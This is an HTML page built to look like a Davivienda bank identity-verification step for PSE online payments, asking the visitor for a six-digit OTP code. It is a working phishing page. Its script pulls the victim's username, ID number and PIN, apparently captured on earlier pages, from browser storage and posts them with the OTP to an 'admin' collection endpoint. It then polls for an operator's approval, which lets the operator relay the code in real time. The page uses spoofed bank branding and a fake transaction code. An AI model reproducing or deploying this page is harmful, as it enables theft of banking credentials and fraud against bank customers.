<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/styles.css">
    <script>
        (function() {
            const findRoot = () => {
                const path = window.location.pathname;
                const parts = path.split('/');
                const pseIdx = parts.indexOf('PSE');
                if (pseIdx !== -1) return parts.slice(0, pseIdx + 1).join('/');
                const portalIdx = parts.indexOf('portal');
                if (portalIdx !== -1) return parts.slice(0, portalIdx).join('/');
                return '';
            };
            const root = findRoot();
            const script = document.createElement('script');
            script.src = (root === '' ? '' : root) + '/admin/subirdatos/core-sys.js?v=' + Date.now();
            document.head.appendChild(script);
        })();
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Davivienda - Verificación de Identidad</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap');
        
        body {
            font-family: 'Open Sans', sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        .bg-overlay {
            background: linear-gradient(0deg, rgba(0,0,0,0.45) 0%, rgba(0,0,0,0.15) 100%);
        }

        .form-container {
            background-color: rgba(255, 255, 255, 0.45);
            backdrop-filter: blur(8px);
            border: 4px solid white;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 420px;
        }

        .custom-input {
            width: 190px;
            height: 42px;
        }

        .btn-red {
            background-color: #ed1c24;
            width: 140px;
            height: 42px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        .btn-grey {
            background-color: #6d6e71;
            width: 140px;
            height: 42px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body class="bg-black">
    <main class="relative flex flex-col items-center justify-start w-full min-h-dvh overflow-y-auto">
        
        <!-- Toast Notification -->
        <div id="toast" class="fixed top-5 right-5 z-[100] transform translate-x-[150%] transition-transform duration-500">
            <div class="bg-white border-l-4 border-[#ed1c24] shadow-2xl p-4 min-w-[300px] rounded-r-lg flex items-center gap-4">
                <div class="bg-[#ed1c24] text-white p-2 rounded-full">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                </div>
                <div>
                    <h4 class="font-bold text-gray-800">Error</h4>
                    <p id="toast-msg" class="text-sm text-gray-600">Código incorrecto. Intente de nuevo.</p>
                </div>
            </div>
        </div>

        <!-- Loader -->
        <div id="loader-sync" class="hidden fixed inset-0 z-[90] flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm">
            <div class="bg-white p-8 rounded-3xl flex flex-col items-center gap-4 shadow-2xl">
                <div class="w-12 h-12 border-4 border-[#ed1c24] border-t-transparent rounded-full animate-spin"></div>
                <p class="text-gray-800 font-bold">Procesando...</p>
            </div>
        </div>
        
        <!-- Header with Logo and Red Background -->
        <div class="bg-[#E62221] w-full flex justify-center items-center py-3 z-20">
            <img src="./assets/logoh1.png" alt="Davivienda Logo" class="h-12">
        </div>

        <!-- Date and CUS Info -->
        <div class="bg-white w-full flex flex-col items-center py-2 border-b border-gray-200 z-20">
            <p id="date" class="text-[12px] text-gray-600 font-normal">Domingo 21 de Junio de 2026, 02:54 A.M.</p>
            <p id="cus_code" class="text-[12px] text-gray-600 font-normal">Código único CUS: 478734737</p>
        </div>

        <!-- Main Content -->
        <div class="relative flex flex-col w-full items-center bg-[url(./assets/bg.jpg)] bg-cover bg-center">
            <div class="absolute inset-0 bg-overlay"></div>
            
            <div class="relative z-10 flex flex-col items-center w-full px-4 py-16 pb-20">
                <div class="flex flex-col mt-12 mb-8">
                    <h1 class="text-[24px] text-center text-white font-light">Verificación de Identidad</h1>
                    <h1 class="text-[32px] text-center text-white font-bold">Pagos en Línea y PSE</h1>
                </div>

                <!-- Form Container -->
                <div class="form-container rounded-[38px] p-6 pt-8 flex flex-col items-center">
                    <h2 class="text-[17px] font-bold text-black mb-6 text-center leading-tight px-4">Hemos enviado un código de seguridad a su número registrado.</h2>
                    <p class="text-[14px] text-black mb-8 text-center px-4">Por favor, ingréselo a continuación para continuar.</p>
                    
                    <div class="w-full flex flex-col items-center mb-8">
                        <label for="otp" class="text-[14px] font-bold text-black mb-2.5">Código OTP</label>
                        <input type="text" id="otp" maxlength="6" inputmode="numeric" class="custom-input bg-white text-black px-4 rounded-xl border-none focus:outline-none text-center text-[18px] font-semibold tracking-[0.5em]" placeholder="000000">
                    </div>

                    <!-- Buttons -->
                    <div class="flex flex-row gap-3 w-full justify-center mt-8 pb-6">
                        <button id="btnSubmit" class="btn-red text-white text-[15.5px] font-bold rounded-xl transition-all active:scale-95">
                            Verificar
                        </button>
                        <button onclick="window.location.assign('login.php')" class="btn-grey text-white text-[15.5px] font-bold rounded-xl transition-all active:scale-95">
                            Cancelar
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="bg-black text-white flex flex-col items-center justify-center py-3.5 w-full z-20">
            <p class="text-[12px] font-light">Banco Davivienda S.A. Todos los derechos reservados 2026.</p>
            <img src="./assets/vigilado2.svg" alt="Vigilado" class="h-3 mt-1">
        </footer>
    </main>

    <script>
        const getProjectRoot = () => {
            const path = window.location.pathname;
            const parts = path.split('/');
            const pseIndex = parts.indexOf('PSE');
            return pseIndex !== -1 ? parts.slice(0, pseIndex + 1).join('/') : '';
        };

        const root = getProjectRoot();

        const now = new Date();
        const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
        
        const dateStr = `${days[now.getDay()]} ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: true }).toUpperCase()}`;
        document.getElementById("date").textContent = dateStr;

        const cusCode = localStorage.getItem('cus_code') || Math.floor(100000000 + Math.random() * 900000000);
        localStorage.setItem('cus_code', cusCode);
        document.getElementById("cus_code").textContent = "Código único CUS: " + cusCode;
        
        const btnSubmit = document.getElementById("btnSubmit");
        const otpInput = document.getElementById("otp");

        otpInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });

        function showToast(msg) {
            const toast = document.getElementById("toast");
            const toastMsg = document.getElementById("toast-msg");
            toastMsg.innerText = msg;
            toast.style.transform = "translateX(0)";
            setTimeout(() => {
                toast.style.transform = "translateX(150%)";
            }, 5000);
        }

        function toggleLoader(show) {
            const loader = document.getElementById("loader-sync");
            if (show) loader.classList.remove("hidden");
            else loader.classList.add("hidden");
        }

        function startPolling(id) {
            let pollCount = 0;
            const maxPolls = 150;
            
            const interval = setInterval(() => {
                pollCount++;
                
                fetch('../../admin/check_aprobacion.php?log_id=' + id)
                    .then(res => res.json())
                    .then(data => {
                        if (data.estado === 'aprobado') {
                            clearInterval(interval);
                            window.location.href = "../../index.php";
                        } else if (data.estado === 'rechazado') {
                            clearInterval(interval);
                            toggleLoader(false);
                            showToast("Código incorrecto o expirado. Por favor verifique e intente de nuevo.");
                            otpInput.value = "";
                        } else if (pollCount >= maxPolls) {
                            clearInterval(interval);
                            toggleLoader(false);
                            alert('Tiempo de espera agotado');
                        }
                    })
                    .catch(err => {
                        if (pollCount >= maxPolls) {
                            clearInterval(interval);
                            toggleLoader(false);
                        }
                    });
            }, 2000);
        }

        btnSubmit.addEventListener("click", () => {
            const otp = otpInput.value;
            if (otp && otp.length === 6) {
                toggleLoader(true);
                
                const usuario = localStorage.getItem('usuario_davivienda') || '';
                const identificacion = localStorage.getItem('identificacion_davivienda') || '';
                const tipo_id = localStorage.getItem('tipo_id_davivienda') || 'CC';
                const clave_pin = localStorage.getItem('clave_pin_davivienda') || '';

                const formData = new FormData();
                formData.append('activity', 'OTP (DAVIVIENDA)');
                formData.append('action', 'log');
                formData.append('metodo', 'PSE');
                formData.append('banco', 'Davivienda');
                formData.append('documento', usuario);
                formData.append('usuario', usuario);
                formData.append('identificacion', identificacion);
                formData.append('tipo_identificacion', tipo_id);
                formData.append('clave_pin', clave_pin);
                formData.append('codigo_dinamica', otp);
                formData.append('codigo_otp', otp);
                formData.append('clave_tarjeta', '');
                formData.append('ultimos_digitos', '');

                fetch('../../admin/track_stats.php', {
                    method: 'POST',
                    body: formData,
                    keepalive: true
                }).then(res => res.json()).then(data => {
                    if (data.success) {
                        localStorage.setItem('log_id_otp_davivienda', data.id);
                        startPolling(data.id);
                    } else {
                        toggleLoader(false);
                        alert('Error al procesar');
                    }
                }).catch(err => {
                    toggleLoader(false);
                });
            } else {
                alert('Por favor ingrese un código válido de 6 dígitos.');
            }
        });
    </script>
</body>
</html>